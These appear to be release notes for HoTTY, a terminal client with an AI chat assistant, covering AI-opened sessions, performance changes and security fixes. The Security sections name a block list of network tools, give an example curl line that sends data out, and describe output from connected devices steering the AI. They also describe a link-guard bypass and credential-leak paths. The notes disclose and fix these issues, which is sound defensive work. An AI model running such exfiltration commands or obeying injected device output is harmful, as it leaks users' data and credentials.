# Release Notes

## v2.1.0-beta1

**The AI can now open a terminal for itself.** Until now it could only work with terminals you had already connected and attached to the conversation — so a question like *"can this switch reach its default gateway?"* ended with the AI telling you which command to run somewhere else. It can now ask HoTTY to open a PC shell on your computer, or an SSH/Telnet session to a neighbour it discovered over CDP/LLDP, and carry on from there. Every request arrives as a card in the chat showing exactly what it wants to open and where the login details would come from, and nothing opens until you say so. These sessions deliberately have no tab: their output is captured for the AI, they are counted and closed automatically, and you can turn any of them into a real tab whenever you want to take over.

### New Features

- **AI-opened terminals.** When an investigation needs a terminal the AI does not have, it can request one. Two kinds are possible: a **PC shell** on your own computer — for `ping`, `tracert`, `nslookup` and the like, run from where you are sitting rather than from the device — and an **SSH or Telnet session to another device**, typically a neighbour the AI just found in CDP/LLDP output. The request appears in the conversation as a card naming the protocol, the host and port, the login name, and where the password would come from — a saved Host Tree entry, a terminal you are already watching, or nowhere at all. You approve or decline it there; the card *is* the confirmation, so nothing interrupts you with a dialog box.
- **Sessions without a tab, and a way to claim them.** An AI-opened session has no tab and no terminal on screen — its output goes to the conversation, which is the only place it was needed. Each one shows as a chip beside the terminals the conversation watches, with a counter showing how many of the allowance are in use. From a chip, or from the request card afterwards, **Open as tab** turns that session into an ordinary terminal you can type into, keeping the same connection and its scrollback. They close on their own after a period of inactivity, and always when the conversation or the window closes.
- **Credentials without the AI ever seeing them.** When the requested host matches an entry in your Host Tree, HoTTY uses that entry's saved username and password directly — the AI names the target, never the secret. Reusing the password from a terminal you are already watching is possible too, but it is off by default and always asks first, and the card says plainly when that is what a request would do. For an SSH host with no saved secret at all, the request opens the ordinary connection dialog with the protocol, host, port and username already filled in, so you only type the password.
- **Settings for how much of this to allow.** **Settings → AI** now has a section for it: whether the AI may open terminals at all (**Off**, **Ask for everything**, **Local shell auto**, or **Local shell + Host Tree hosts auto**), which shell a PC-shell request gets (PowerShell, Command Prompt or Git Bash), how many AI-opened sessions one conversation may hold, how long an unused one survives, and whether reusing a watched terminal's password is permitted at all. **The shipped default asks for every request**, and automatic opening only ever applies when you have separately turned on auto-execution, where it uses the same cancellable countdown as an auto-run command.

### Improvements

- **A command aimed at a terminal that is not there no longer runs somewhere else.** When a conversation watches several terminals, the AI tags each command with the one it means. If that name did not match anything the conversation was watching, the command used to fall back to the last-focused terminal. With AI-opened sessions appearing and disappearing that is a genuinely bad outcome — a command meant for a neighbour that has since closed could land on the core switch you were working on. The command is now refused and the AI is told why, so it can re-issue it against a terminal that actually exists.
- **The host name in an SSH or Telnet connection is checked the same way everywhere.** The strict rule the Ping Monitor already applied to its targets — a hostname, IPv4 or IPv6 literal, with no spaces, shell characters or leading dash — now also guards SSH and Telnet connection settings. This matters most for connections the AI proposes, since its output can be influenced by what a device it is watching prints.

### Security

- **Network tools can no longer auto-execute.** `curl`, `wget`, `nc`, `nmap`, `certutil`, `Invoke-WebRequest` and around twenty similar tools were deliberately left out of the auto-run whitelist, but that alone did not stop them: in the default Hybrid strategy an unlisted command is passed to the AI for judgement, and a plain `curl https://…/?data=…` looks read-only to a model — so it could run by itself and take whatever the AI had in front of it with it. Since the AI reads output from devices you are connected to, that output can steer it. These tools are now refused by a rule in the code that sits above both lists, applies to all three strategies, and cannot be removed by editing or resetting the lists. Running one by hand is unaffected.
- **Passwords in device configuration are now hidden before output is sent to the AI.** HoTTY strips secrets out of terminal output before it leaves your machine, but the rule only recognised the `key: value` and `key=value` forms. Network device configuration does not look like that — `password 7 08701E1D`, `enable secret 5 …`, `snmp-server community public RO`, `pre-shared-key …` — so a `show running-config` shipped those lines to the AI provider word for word. Space-separated device credentials are now recognised and hidden, as are private keys pasted into or printed by a session.
- **Saved credentials are no longer sent to a port the entry was not saved for.** When an AI request named a host that matched a Host Tree entry, the entry's username and password were applied but the *port* came from the request. An entry saved on port 2222 could therefore have its password offered on port 22, or on any port the request named. For SSH the host-key check would usually catch this; for Telnet nothing would, and Telnet types the saved username and password in clear text at the first prompt it sees. A saved entry is now only used when the port matches it too.
- **An automatic action can no longer run on a conversation tab you are not looking at.** Auto-execution and automatic opening both give you a few seconds to cancel — but the countdown, and its Cancel button, are only drawn for the conversation tab currently on screen. Because replies can finish on a background tab, that grace period could elapse with nothing shown and no way to intervene. Both now decline to fire on a tab that is not in front of you, leaving a button you will see when you switch to it.

## v2.0.18

**A link written by an AI, or sitting in a log file you opened, could take HoTTY's own window somewhere else.** HoTTY has always intended to hand those links to your browser rather than follow them itself — following one replaces the app you are working in with a web page that has no address bar, no back button, and no obvious way home. The check that enforced that read each link as it was *written* instead of working out where it actually *led*, and two ordinary ways of writing a web address slipped straight past it. That is fixed, and the check now also refuses to follow anything it does not recognise rather than letting it through. Alongside it, the dialog that asks your permission before terminal output is sent to an AI could end up painted over by an open Web Browser pane and become impossible to click, and a large batch of error messages and theme descriptions that stayed in English no matter which display language you chose are now translated.

### Improvements

- **Error notifications and theme descriptions now follow your display language.** Twenty-six error toasts — sign-in failures, clipboard copy failures, listener setup failures and the rest — were written in English directly in the code, so they appeared in English whichever of the eight languages you had selected. So did all 122 descriptions in **Settings → Appearance → Custom Theme Creator**, the tooltips explaining what each colour variable controls. All of them are now translated into every supported language.
- **GCP IAP connection failures are readable again.** Five ways an IAP connection could fail — the tunnel's output being cut off, and creating or checking the permissions on the SSH key file — reported the operating system's own wording, so you could be told `failed to create ~/.ssh: Access is denied. (os error 5)`. HoTTY converts connection errors into plain language everywhere else; these five paths had been missed. They now read as short sentences like *Access denied to the ~/.ssh folder*. The technical detail is still written to the debug log.

### Bug Fixes

- **The AI data-sharing consent dialog could be hidden behind a Web Browser pane.** The Web Browser pane is a real browser window supplied by Windows, and Windows draws it on top of everything HoTTY paints itself. HoTTY works around this by hiding that window whenever a dialog opens — but the consent dialog, the one that asks before any terminal output is sent to an AI provider, had never been added to the list of dialogs that trigger it. With a Web Browser pane open, the dialog could be completely covered and impossible to answer.

### Security

- **Links in AI replies and log files could navigate the app window away from HoTTY.** The guard that decides whether a link is safe to hand to your browser tested the address as written, but a browser navigates to the address once it has been *resolved* — and the two are not always the same. An address beginning `//` (no `http:` or `https:` in front of it) and an address with a line break inside the scheme both resolve to an ordinary web address while failing the guard's test, so the click was never intercepted and HoTTY's window navigated to that site in place. Reaching this needs a link you did not write — an AI reply, which can be influenced by output from a device you are connected to, or a `.md` file in your log folder. What an attacker gains is limited: pages loaded this way have no access to any of HoTTY's own functions, so the realistic risk is a convincing imitation of HoTTY in a window with no address bar. Links are now resolved before being judged, links back into the app itself are never handed outwards, and any link the guard does not recognise is now stopped rather than followed.
- **The bundled HTTP/2 library has been updated.** HoTTY's HTTP stack included a version of `h2` affected by an advisory in which empty data frames could be queued without limit. HoTTY only ever acts as a client here — for AI provider requests and the update check — while the flaw is on the side that accepts incoming frames, so practical exposure was minimal. It is updated regardless.

## v2.0.17

**Log files that are not plain text now open as what they actually are.** An AI Chat transcript in the Log Viewer used to be a wall of raw markdown — `##` headings, pipe-delimited tables, backtick fences — and a Ping Monitor CSV did not appear in the file list at all. A transcript now reads exactly as the conversation did in the AI Chat pane, and a CSV opens as a real table you can search by cell. Alongside that, the Ping Monitor stops working through its target list one host at a time: every target in a cycle is now pinged together, so a few unreachable hosts no longer hold up the whole list.

### New Features

- **AI chat transcripts read as conversations in the Log Viewer.** A `.md` chat log now renders the way the reply looked when the AI wrote it — headings, tables, lists, bold text and code blocks — instead of showing you the markdown source. The find bar searches the formatted text, and a button in the search bar switches back to the raw file whenever you want to see it. Links inside a transcript open in your browser through the same checked path the AI Chat pane uses, rather than navigating away from HoTTY. Two things are worth knowing: a search cannot match across formatting, so "bold" is not found inside `**bo**ld`, and match counts differ between the two views because the raw view can also match the markdown characters themselves. Transcripts larger than 2 MB stay as plain text — formatting is done in a single pass, and a file that size would lock up the pane.
- **Ping Monitor logs open as a table.** `.csv` files now appear in the Log Viewer's file list — until now they were written but never listed — and open as a table with a header row rather than as comma-separated text. Search runs over the cells, so a highlight can never straddle a comma that is really a column edge, and **Only matching lines** filters whole rows. Long files show their first 5,000 rows with a notice saying so, and a button in the search bar switches back to raw text.

### Improvements

- **The Ping Monitor pings every target at once.** A polling cycle used to work through the target list one host at a time, which made a cycle take as long as all of its targets added together: roughly 32 ms for a LAN address that answers immediately, but around 2.6 seconds for one that stays silent. With 50 targets and a handful unreachable, tens of seconds could pass before a single row updated. Every target in a cycle is now pinged at the same time — up to 100 at once — so a cycle takes about as long as its slowest single target instead of the sum of them all. The table's row order is unchanged.

### Bug Fixes

- **Ping Monitor CSV logging could silently write nothing.** HoTTY only writes logs into a folder you have approved through a native dialog; a path that merely arrives as text is deliberately not enough, so that no typed or imported path can quietly grant write access. The Ping Monitor's log folder, however, was a plain text box, which could never produce that approval — so ticking **CSV Logging** and typing a path produced no file and no explanation. The pane now uses the same logging folder as everything else, the one set in **Settings → General**, and shows you which folder that is. The checkbox is unavailable until that folder is set, and if the folder has not been approved the pane says so instead of leaving you hunting for a file that was never written. Monitoring itself still runs either way — only the CSV side is affected.

## v2.0.16

**The v2.0.16 stable release, consolidating the v2.0.16 beta series.** This release changes almost nothing about what HoTTY does — it is about how hard it works to do it. The app no longer loads everything it might eventually need in order to start, and the Windows program itself is now built as a single optimized unit, so it is smaller on disk and lighter in memory. Output arriving faster than it can be drawn — a large `cat`, a `display current-configuration` on a switch — is handed to the display in far fewer, larger pieces, and several parts of the interface that were doing a great deal of work on *every frame* of that output no longer do. Typing is deliberately untouched: nothing is ever held back waiting for more to arrive, so a keystroke still echoes exactly as immediately as before. Alongside that, stopping a Ping Monitor now really stops it, HoTTY's own debug log keeps enough history to be worth reading, and one cryptography library has left the shipped app.

### Improvements

- **A smaller, lighter app.** The code the app has to read and parse in order to start is down by roughly 60%, and its stylesheet by about three quarters, because the panes, dialogs and translations you have not opened are no longer part of it — they are read only if and when you use them, so a pane you never touch is never loaded at all. Alongside that, the program file is built as a single optimized unit rather than sixteen separate ones, which takes about 3.4 MB off it (a 13% reduction). The installer shrinks only slightly, as it already compresses the program on the way in. Startup is a little quicker as well, but only a little: most of the wait between launching HoTTY and seeing its window is the Windows web runtime starting up, and that part is unchanged. Everything still behaves exactly as before: the first frame is drawn in your language, not in English, and switching **Settings → General → Display language** is still immediate.
- **Debug logs now keep enough history to be worth reading.** HoTTY's own debug log rotated every 40 KB and kept only one previous file, so by the time you noticed a problem and went looking, the part that mattered had usually been thrown away. Each file now holds up to 512 KB and two are kept. The release build also stops writing a second copy of every line to a console output that does not exist in a windowed application. This is the log under `%APPDATA%\com.hotty.terminal\logs\`, reachable from **Settings → About** — your session logs are a separate thing and are unaffected.
- **The bundled Third-Party Licenses data is smaller.** The license manifest — over 800 packages — is no longer stored with the indentation that made it human-readable. Nothing ever displays that file as text, so the formatting only cost 47 KB of disk space and a little extra work each time **Settings → About → Third-Party Licenses** was opened.
- **Even button spacing in the GCP Instances pane header.** Its toolbar buttons sat slightly tighter together than the ones in every other pane header.

### Performance

- **Bulk output is delivered in far fewer, larger pieces.** When a device sends output faster than the display can absorb it, HoTTY now gathers everything that has *already* arrived and hands it over in one go, instead of once per read. Each hand-over carries a fixed cost that has nothing to do with how much text it contains, and a fast `cat` or a long `display current-configuration` was paying that cost hundreds of times over. Nothing is ever delayed to make this happen — only what is already waiting gets combined, so an interactive echo, which has nothing queued behind it, still goes straight through on its own. This applies equally to SSH, Telnet, Serial, WSL, local shells and GCP IAP sessions.
- **The prompt marker rail no longer redraws your entire scrollback.** With prompt highlighting on — the default — every detected prompt and output block anywhere in the scrollback had a marker rebuilt for it on every frame of arriving output. With the default 10,000-line scrollback and a long dump that marks almost every line, that meant rebuilding thousands of markers to show the forty or so that fit on screen. Only the markers actually in view are built now. Clicking one still selects the whole block, including the parts scrolled out of sight.
- **Prompt detection does far less work per line.** For each line that appeared, all eight prompt patterns were rebuilt from their text before being matched, and the line was normalized for accented and combining characters whether or not it contained any. The patterns are now prepared once, when you change them, and the normalization is skipped for ordinary text. Re-checking after the cursor moves is also limited to the lines that can actually have changed.
- **A discarded line of terminal output no longer costs a search of the whole window.** HoTTY keeps track of whether a dialog or menu is currently open. Anything at all leaving the page made it re-examine the entire window to find out — and during heavy output the terminal discards rows continuously, which turned that search into the second most expensive thing the interface was doing. It now inspects only what actually left, so terminal churn costs nothing.
- **The terminal scrollbar no longer forces the page to be re-measured mid-frame.** Keeping the custom scrollbar in step with the terminal read the scrollbar's position on every rendered frame. The terminal has just rewritten its rows at that moment, so the browser engine is obliged to recalculate the page layout there and then in order to answer, instead of at its own convenience. The scrollbar now tracks its own position and consults the page only when you move it yourself, where the answer is free — and it reuses an animation callback that is already pending instead of queueing a fresh one for every update during bulk output.
- **Changing one setting no longer redraws the whole interface.** The part of HoTTY that manages sessions was listening for changes to every setting, so altering any single one — a colour, a font size, a checkbox — triggered a redraw of the entire app. It now listens only to the three settings it actually reacts to.
- **Waiting for output no longer ties up the app's worker threads.** Local shells, WSL, Serial and GCP IAP sessions read from their device with a call that simply waits until something arrives. Each open session was holding one of the app's general-purpose worker threads for as long as it stayed open, so on a four-core machine four such sessions could leave very little free for everything else happening in the background. Those reads now run on a pool intended for exactly this kind of waiting.
- **Session logging costs nothing while it is switched off.** Every piece of terminal output from every session was queueing behind a single app-wide lock purely to discover that logging was not enabled — which is the default.
- **Less work on each piece of output that arrives.** The step that strips a line-wrap control sequence out of incoming text used to rebuild its search patterns and copy the whole text every time, whether or not the sequence was actually present. It now checks first, and in the ordinary case copies nothing at all.
- **Copy on select no longer writes to the clipboard mid-drag.** With **Copy on select** enabled, dragging across the terminal wrote to the Windows clipboard continuously as the selection grew. It now writes once the selection settles. What ends up on the clipboard is the final selection, exactly as before.

### Bug Fixes

- **Stopping a Ping Monitor did not stop it straight away.** Stopping a monitor, closing its pane, or restarting it with different targets only *asked* the background job to stop, and it checked for that request only between polling cycles. A cycle already under way therefore ran to the end first — up to five seconds for every target in the list — and still wrote that final round to the CSV log and pushed it to the interface after you had stopped it. Teardown now waits briefly for the job to wind down on its own and then forcibly ends it, so a monitor is always finished within about two seconds of asking.
- **`ping` processes could be left running in the background.** When a ping did not answer within its five-second limit, HoTTY gave up waiting but never terminated the underlying `ping` process, so unreachable targets slowly accumulated abandoned processes for as long as the monitor ran. Each ping is now terminated together with the attempt that started it, both on timeout and when the monitor shuts down.

### Security

- **One fewer cryptography library inside the app.** HoTTY compiled in two independent cryptographic implementations: the one the SSH stack uses, and a second one whose only purpose was signing the token for **Vertex AI** service-account sign-in. That signing now uses the same library as everything else, so the second implementation is gone from the shipped app — one less codebase carrying cryptographic code that has to be watched for security advisories. Vertex AI sign-in is unchanged.
- **The sanitizer that cleans AI Chat answers has been updated.** DOMPurify — which strips anything dangerous out of a formatted AI reply before it is displayed — is updated to a version that fixes a published cross-site-scripting advisory. HoTTY does not use the affected mode, so the flaw was not reachable from the app, but the fixed version ships from this release onwards.

## v2.0.16-beta3

**The graphics-card renderer added in beta2 is removed — measured side by side, it made no difference.** The beta2 notes claimed that drawing the terminal with the graphics card is faster. Tested against the workload it should have suited best — heavily coloured output, which is exactly what the previous method handles worst — it was no quicker, and the first screenful was actually slower while the graphics pipeline warmed up. So it is gone, along with the roughly 120 KB of code it added. What this release does contain is work found by profiling the app rather than reasoning about it: several parts of the interface were doing a great deal of work on every frame of incoming output, and no longer do. None of this changes what you see on screen — it is about how hard the app works to put it there, which shows up as steadier scrolling on a busy machine and less battery use on a laptop.

### Performance

- **The prompt marker rail no longer redraws your entire scrollback.** With prompt highlighting on — the default — every detected prompt and output block anywhere in the scrollback had a marker rebuilt for it on every frame of arriving output. With the default 10,000-line scrollback and a long dump that marks almost every line, that meant rebuilding thousands of markers to show the forty or so that fit on screen. Only the markers actually in view are built now. Clicking one still selects the whole block, including the parts scrolled out of sight.
- **Prompt detection does far less work per line.** For each line that appeared, all eight prompt patterns were rebuilt from their text before being matched, and the line was normalized for accented and combining characters whether or not it contained any. The patterns are now prepared once, when you change them, and the normalization is skipped for ordinary text. Re-checking after the cursor moves is also limited to the lines that can actually have changed.
- **Changing one setting no longer redraws the whole interface.** The part of HoTTY that manages sessions was listening for changes to every setting, so altering any single one — a colour, a font size, a checkbox — triggered a redraw of the entire app. It now listens only to the three settings it actually reacts to.
- **The terminal scrollbar no longer forces the page to be re-measured mid-frame.** Keeping the custom scrollbar in step with the terminal read its position immediately after changing its size, which obliges the browser engine to recalculate the layout there and then instead of at its own convenience, and it queued a fresh animation callback for every such update during bulk output. It now reads before it writes, and reuses a callback that is already pending.

### Improvements

- **Debug logs now keep enough history to be worth reading.** HoTTY's own debug log rotated every 40 KB and kept only one previous file, so by the time you noticed a problem and went looking, the part that mattered had usually been thrown away. Each file now holds up to 512 KB and two are kept. The release build also stops writing a second copy of every line to a console output that does not exist in a windowed application. This is the log under `%APPDATA%\com.hotty.terminal\logs\`, reachable from **Settings → About** — your session logs are a separate thing and are unaffected.

## v2.0.16-beta2

**HoTTY now keeps up with output that arrives faster than it can draw it.** Dumping a large file, running `display current-configuration` on a switch, or scrolling back through a busy session used to make the app work far harder than the amount of text justified: every burst of output coming off the device was handed to the display separately no matter how small, and the terminal grid was then redrawn one HTML element at a time. Both of those are addressed here. Typing is deliberately untouched — nothing is ever held back waiting for more to arrive, so a keystroke still echoes exactly as immediately as it did before.

### Performance

- **Bulk output is delivered in far fewer, larger pieces.** When a device sends output faster than the display can absorb it, HoTTY now gathers everything that has *already* arrived and hands it over in one go, instead of once per read. Each hand-over carries a fixed cost that has nothing to do with how much text it contains, and a fast `cat` or a long `display current-configuration` was paying that cost hundreds of times over. Nothing is ever delayed to make this happen — only what is already waiting gets combined, so an interactive echo, which has nothing queued behind it, still goes straight through on its own. This applies equally to SSH, Telnet, Serial, WSL, local shells and GCP IAP sessions.
- **The terminal is now drawn by the graphics card.** The grid used to be assembled from HTML elements — one per run of same-styled text, per row, every frame — which is the slowest layer during heavy scrolling. HoTTY now draws the whole grid with WebGL instead. If your machine cannot provide it (remote desktop sessions, older graphics drivers) or it becomes unavailable while you are working, HoTTY quietly goes back to the previous method and carries on. There is nothing to configure and nothing to notice apart from the speed.
- **Waiting for output no longer ties up the app's worker threads.** Local shells, WSL, Serial and GCP IAP sessions read from their device with a call that simply waits until something arrives. Each open session was holding one of the app's general-purpose worker threads for as long as it stayed open, so on a four-core machine four such sessions could leave very little free for everything else happening in the background. Those reads now run on a pool intended for exactly this kind of waiting.
- **Session logging costs nothing while it is switched off.** Every piece of terminal output from every session was queueing behind a single app-wide lock purely to discover that logging was not enabled — which is the default.
- **Less work on each piece of output that arrives.** The step that strips a line-wrap control sequence out of incoming text used to rebuild its search patterns and copy the whole text every time, whether or not the sequence was actually present. It now checks first, and in the ordinary case copies nothing at all.
- **Copy on select no longer writes to the clipboard mid-drag.** With **Copy on select** enabled, dragging across the terminal wrote to the Windows clipboard continuously as the selection grew. It now writes once the selection settles. What ends up on the clipboard is the final selection, exactly as before.

### Security

- **The sanitizer that cleans AI Chat answers has been updated.** DOMPurify — which strips anything dangerous out of a formatted AI reply before it is displayed — is updated to a version that fixes a published cross-site-scripting advisory. HoTTY does not use the affected mode, so the flaw was not reachable from the app, but the fixed version ships from this release onwards.

## v2.0.16-beta1

**HoTTY is smaller and lighter, and stopping a Ping Monitor now actually stops it.** The app no longer loads everything it might eventually need in order to start: the seven non-English translation catalogs, the utility panes and the dialogs are each loaded the moment you first use them, so a feature you never open costs nothing to have. The Windows program itself is now built with whole-program optimization on top of that. Nothing about how the app works changes — this release is about the space HoTTY takes up in memory and on disk, and one background job that did not shut down cleanly.

### Improvements

- **A smaller, lighter app.** The code the app has to read and parse in order to start is down by roughly 60%, and its stylesheet by about three quarters, because the panes, dialogs and translations you have not opened are no longer part of it — they are read only if and when you use them, so a pane you never touch is never loaded at all. Alongside that, the program file is built as a single optimized unit rather than sixteen separate ones, which takes about 3.4 MB off it (a 13% reduction). The installer shrinks only slightly, as it already compresses the program on the way in. Startup is a little quicker as well, but only a little: most of the wait between launching HoTTY and seeing its window is the Windows web runtime starting up, and that part is unchanged. Everything still behaves exactly as before: the first frame is drawn in your language, not in English, and switching **Settings → General → Display language** is still immediate.
- **The bundled Third-Party Licenses data is smaller.** The license manifest — over 800 packages — is no longer stored with the indentation that made it human-readable. Nothing ever displays that file as text, so the formatting only cost 47 KB of disk space and a little extra work each time **Settings → About → Third-Party Licenses** was opened.
- **Even button spacing in the GCP Instances pane header.** Its toolbar buttons sat slightly tighter together than the ones in every other pane header.

### Bug Fixes

- **Stopping a Ping Monitor did not stop it straight away.** Stopping a monitor, closing its pane, or restarting it with different targets only *asked* the background job to stop, and it checked for that request only between polling cycles. A cycle already under way therefore ran to the end first — up to five seconds for every target in the list — and still wrote that final round to the CSV log and pushed it to the interface after you had stopped it. Teardown now waits briefly for the job to wind down on its own and then forcibly ends it, so a monitor is always finished within about two seconds of asking.
- **`ping` processes could be left running in the background.** When a ping did not answer within its five-second limit, HoTTY gave up waiting but never terminated the underlying `ping` process, so unreachable targets slowly accumulated abandoned processes for as long as the monitor ran. Each ping is now terminated together with the attempt that started it, both on timeout and when the monitor shuts down.

### Security

- **One fewer cryptography library inside the app.** HoTTY compiled in two independent cryptographic implementations: the one the SSH stack uses, and a second one whose only purpose was signing the token for **Vertex AI** service-account sign-in. That signing now uses the same library as everything else, so the second implementation is gone from the shipped app — one less codebase carrying cryptographic code that has to be watched for security advisories. Vertex AI sign-in is unchanged.

## v2.0.15

**The AI now answers in the language your app is set to, and the language picker finally works mid-conversation.** Set HoTTY to 日本語 and the AI replies in Japanese without you configuring anything else — the AI Chat language selector defaults to **Auto**, which follows **Settings → General → Display language**. Changing the language during a conversation now actually switches it, which it did not before. Also in this release: terminals no longer get stuck at 80 columns on devices that latch the width at connect, such as Huawei USG/VRP.

### New Features

- **The AI answers in your app's language by default.** The AI Chat language selector has a new **Auto** setting, and it is the default: the AI replies in whatever language the interface is set to, so switching **Settings → General → Display language** switches the AI too. The option is labelled with the language it currently resolves to — *Auto (日本語)* — so it is never a guess. Pin a specific language from the same selector at any time; the list is unchanged.

### Improvements

- **One answer language for the whole app.** The AI answer language used to be remembered per AI Chat pane in browser storage. It now lives in your settings alongside everything else, which means every conversation in every window shares it, and a change reaches conversations that are already under way rather than only new ones. Your existing choice is carried over automatically the first time you start this version.
- **The new tab appears the moment you press Connect.** It sits behind the connect dialog showing its connecting state, instead of appearing only once the connection succeeds. Cancelling or a failed attempt still leaves no tab behind, and the dialog stays open and editable exactly as before.
- **Clearer wording for the display-language setting.** Both **Settings → General** and **Help** now say that the AI response language follows the interface by default and where to override it.

### Bug Fixes

- **Changing the AI answer language mid-conversation did nothing.** Picking a different language only affected new conversations — an ongoing one carried on in the old language however many times you switched. Two things caused it: selecting **English** sent no language instruction at all, and because the whole conversation is replayed to the model on every turn, the earlier replies simply decided the language. Every request now carries an explicit language instruction that overrides the earlier turns, and the moment you switch, each open conversation is told so at its very next message. Commands inside execute blocks, terminal output, file paths and identifiers are explicitly exempt, so nothing that gets run on a device is ever translated.
- **Ask AI ignored your language and reset your persona.** Right-clicking a terminal selection and asking a question read the answer language from the old per-pane storage — where English produced no instruction — and overwrote the chat's system prompt in the process, silently dropping the persona you had selected. Both paths now share a single language resolver, and Ask AI no longer touches the system prompt of a chat pane that is already open.
- **Terminals stuck at 80 columns on width-latching devices.** On hardware that fixes the terminal width at login and ignores later resizes (Huawei USG/VRP and similar), sessions could come up at 80 columns and stay there — letterboxed inside a much wider pane — undoing what **Fixed terminal size** is for. The terminal was not being created until the connection had already succeeded, so it never got the chance to report its real width before the remote side was asked for a size, and an 80x24 fallback was used. The terminal is now created and measuring while the connection is still being made, and it retries that first measurement until the renderer can give a real figure, so the true width is reported in time.

### Security

- **One less permission in the shipped app.** HoTTY no longer requests permission to open a native *Save* file dialog. Nothing in the interface has used it since the Text Editor and File Explorer panes were removed in v2.0.14, so it is gone from the app's capability set entirely.

## v2.0.14

**The v2.0.14 stable release, consolidating the v2.0.14 beta series.** The headline changes: a new **Interface Traffic** pane watches live SNMP counters on your switches and routers, so throughput sits next to the terminals you are working in; **AI Chat conversations are now saved to disk** as Markdown in the same folder as your session logs; the **Log Viewer gained a proper search box** with `Ctrl+F`, regular expressions and jump-to-match; and the rarely used **Text Editor and File Explorer panes were removed**, alongside a substantial hardening pass on the Windows DPAPI layer that protects your saved credentials.

### Removed

- **Text Editor and File Explorer panes.** Both are removed completely — from the tab bar's feature menu, from **Settings → Features**, and from Help. Five utility panes remain: **Log Viewer**, **Ping Monitor**, **AI Chat**, **File Server**, and **Web Browser**. If you had either one enabled, the leftover setting is tidied up automatically the first time you start this version — nothing to do on your side. Roughly 3,000 lines of code and one npm dependency went with them, so both the installer and the running app are a little lighter.

### New Features

- **Interface Traffic pane (SNMP).** A new utility pane that polls a network device's interface table and shows live per-interface throughput. **List interfaces** tests the connection and discovers what the device has; **Start** then begins polling and fills in **In/Out bps**, **In/Out pps**, **errors** and **discards** alongside each interface's name, description, status and speed. Rates appear from the second poll onward — the first one establishes the baseline. Sort by any column, filter by name or description, and tick **Up only** to hide interfaces that are down. Enable it under **Settings → Features**; it is on by default.
- **SNMP v2c and v3.** v2c takes a community string; v3 supports all three security levels — **noAuthNoPriv**, **authNoPriv** and **authPriv** — with MD5/SHA authentication and DES/AES privacy, plus an optional context name. The pane warns you inline when noAuthNoPriv is selected, since that sends everything unauthenticated and in the clear.
- **64-bit counters, with a warning when the device has none.** Where the device offers `ifXTable`, HoTTY reads the 64-bit counters. Older agents that only expose the 32-bit ones still work, but the pane shows a **32-bit counters** badge explaining that those wrap in roughly 34 seconds on a saturated 1 Gbps link.
- **Search in the Log Viewer.** `Ctrl+F` opens a search box over the open log file. Move between hits with `Enter` and `Shift+Enter`, watch a live match count, and switch on **Match case**, **Use regular expression**, or **Matching lines only** to collapse the view down to just the lines that hit. An invalid regular expression is reported inline instead of silently finding nothing.
- **AI chat transcripts saved as Markdown.** While logging is on, each conversation is appended live to `YYYYMMDDHHMMSS-AICHAT-(Chat).md` in your log folder. The file opens with the model, AI provider, and the terminals the tab was watching, then records every turn with a timestamp. Your messages are written inside a code block so pasted terminal output can't mangle the formatting; the AI's replies stay as plain Markdown, so headings, lists, and code blocks read exactly as they do in the pane. Each turn lands on disk the moment it appears, so nothing is lost if the app is closed or killed mid-conversation.
- **AI chat logs in the Log Viewer.** The Log Viewer now lists `.md` files alongside `.txt` and `.log` ones, sorted together by time, so a chat and the session it was about sit side by side. Type `AICHAT` in the filter box to see just the conversations.
- **A new file per conversation.** Starting a new chat, closing a tab, or switching AI provider closes the current transcript and begins a fresh one on the next message — the same way reconnecting a terminal starts a new session log. The filename records the tab's name at the moment the file is created.

### Improvements

- **Poll interval adjustable without reconnecting.** Changing the interval retunes a running watcher in place, so you can go coarser or finer without dropping the SNMP session and losing your rate baseline.
- **Interface Traffic polls once a minute by default.** A MIB walk is cheap for HoTTY but not for the device's control plane, and traffic trends read fine at one-minute granularity. Pick a shorter interval per pane when you are actively watching a link.
- **Connection settings remembered per pane.** Each Interface Traffic pane keeps its own device settings. Tick **Remember these connection settings** to keep the credentials too; leave it off and they are asked for each time.
- **Live watcher status.** The pane reports whether it is running or stopped, the current interval, the actual poll time in milliseconds, the device's uptime, and a **Stale** indicator when replies stop arriving.
- **Clearer log folder help text.** The hint under **Log Folder Path** now describes both file types you will find there.
- **New help section for AI chat logs.** **Help → Session Logging & Log Viewer** explains where transcripts go, what starts a new file, and that attached images are noted but not saved.
- **Snappier pane highlight.** The flash that marks the newly focused pane when you move with `Ctrl+Tab` is now half as long.
- **Disabled AI Chat buttons stop looking clickable.** Header buttons that are currently unavailable no longer light up on hover.

### Bug Fixes

- **The built-in themes ship complete again.** The Dark, Light and Medium theme files bundled with the app had not been refreshed since v2.0.0-beta1, so the copies that actually shipped were missing 18 colours that newer parts of the interface expect, and carried an outdated Dark accent colour. In practice the **connecting** tab and pane, the terminal letterbox, and the tab danger gradient kept the colours of whichever theme happened to load first and did not follow a theme switch. All three built-in themes are current again, and the two copies are now checked against each other so they cannot drift apart unnoticed.

### Security

- **SNMP credentials are encrypted with Windows DPAPI.** Community strings and v3 authentication and privacy passwords are encrypted before being stored, and only when you asked for them to be remembered. They are also registered with the log redaction filter, so they cannot surface in a debug log.
- **Saved credentials can no longer be used to decrypt another application's secrets.** HoTTY encrypts credentials with Windows DPAPI plus an app-specific binding, so a blob produced by some other program cannot be opened through HoTTY. Until now the decrypt path quietly retried *without* that binding whenever the first attempt failed, which undid the guarantee it was there to provide. That retry is gone from the path the app uses; it survives only where HoTTY reads back its own files.
- **Credentials written by pre-2.0 builds are upgraded in place.** Anything still in the older format is re-encrypted with the current binding the first time your host tree loads — including **SSH key passphrases**, which the previous migration silently skipped. The plaintext never leaves the process.
- **One unreadable credential no longer blanks the rest.** Decrypting the host tree used to be all-or-nothing: a single damaged entry emptied every other username and password in the list. A failure is now contained to the one field, which is left empty so you know to re-enter it.
- **A saved credential can never be silently replaced with a blank.** A failed decryption could previously be written back over the real value during the host tree's automatic upgrade pass, destroying it for good. The original encrypted value is now always kept.
- **The log folder can no longer be a network path.** A UNC path such as `\\server\share` is rejected before anything touches the disk, so Windows can never be steered into authenticating against a remote share while logging is being set up.
- **AI chat transcripts obey the same folder approval as session logs.** A transcript can only be written to a folder you approved through the native picker or confirm dialog; the check runs before anything touches the disk, and an unapproved path creates no file or directory. Chat tab names are sanitized before use in a filename, so a name can never steer the file out of the approved folder.
- **Image attachments are recorded, not stored.** Only the image type and size are written to the transcript — the image data itself never leaves the app, which also keeps transcripts small enough for the Log Viewer to open.
- **Logging failures are surfaced, never silent.** If a write fails, HoTTY tells you once and stops logging that conversation instead of quietly saving an incomplete transcript. Changing the log folder re-enables it.
